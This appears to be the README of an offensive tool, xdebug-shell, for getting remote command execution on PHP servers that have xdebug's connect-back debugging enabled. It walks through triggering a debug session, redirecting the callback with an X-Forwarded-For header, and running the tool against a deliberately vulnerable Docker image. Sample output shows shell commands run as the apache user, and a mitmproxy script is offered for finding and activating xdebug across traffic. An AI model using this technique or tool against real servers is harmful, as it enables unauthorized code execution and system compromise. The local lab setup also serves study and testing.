# xdebug-shell

Exploiting xdebug to get remote command execution is not new:

* https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/
* https://ricterz.me/posts/Xdebug:%20A%20Tiny%20Attack%20Surface

It is always cool to have a webshell.

## What is xdebug ?

Xdebug is a php extension that allows to debug php pages, remotely by using DGBp protocol. Code repository is located at [xdebug](https://github.com/xdebug/xdebug).

Code execution is possible via injections that exist in `eval` or `property_set` xdebug commands.

## How to activate it ?

For a reverse shell to work, xdebug configuration needs to include:

```
xdebug.remote_enable=true
xdebug.remote_connect_back=true
```

In order to start xdebug, add `XDEBUG_SESSION_START` to query parameters. Remote server will try to connect back to user on port tcp/9000. The endpoint where to connect to can be altered using `X-Forwarded-For` header. For example, if using Docker for Mac to run the xdebug Docker image supplied, you may use `docker.for.mac.localhost` as value.

## How to start a Docker vulnerable image ?

Go into vulnerable-xdebug and type:

```
$ docker build -t vulnerable-xdebug .
$ docker run -ti --rm -p 8080:80 vulnerable-xdebug
AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message
```

[Dockerfile](vulnerable-xdebug/Dockerfile) is based on Centos 7.4.1708 image.

## Get a webshell

```
$ ./xdebug-shell.py --local-host=docker.for.mac.localhost --url=http://127.0.0.1:8080/phpinfo.php
>> id
uid=48(apache) gid=48(apache) groups=48(apache)
>> pwd
/var/www/html
>> uname -a
Linux b8db2353f675 4.9.60-linuxkit-aufs #1 SMP Mon Nov 6 16:00:12 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
>> cat /etc/redhat-release
CentOS Linux release 7.4.1708 (Core)
>> lsmod
Module                  Size  Used by
xfrm_user              32768  1
xfrm_algo              16384  1 xfrm_user
>> ^D
```

## How to scan for xdebug ?

You can use this mitmproxy script [activate-xdebug.py](activate-xdebug.py):

```
$ mitmdump -dd -s "./activate-xdebug.py docker.for.mac.localhost"
```

The script will add xdebug parameter, and add X-Forwarded-For header for the reverse connect to succeed.
